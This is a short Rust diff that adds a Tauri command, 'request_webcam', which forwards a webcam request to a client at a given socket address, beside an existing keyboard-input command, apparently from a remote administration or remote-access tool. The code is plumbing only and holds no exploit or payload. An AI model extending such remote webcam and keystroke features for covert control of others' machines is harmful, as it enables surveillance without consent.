@@ -822,3 +822,19 @@ pub async fn send_keyboard_input(
 
     Ok("Keyboard input sent".to_string())
 }
+
+#[tauri::command]
+pub async fn request_webcam(addr: &str, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<String, String> {
+    let socket_addr = addr.parse()
+        .map_err(|e| format!("Invalid socket address: {}", e))?;
+
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
+
+    channel_tx.send(ServerCommand::RequestWebcam(socket_addr))
+        .await
+        .map_err(|e| e.to_string())?;
+
+
+    Ok("Webcam request sent".to_string())
+}
+
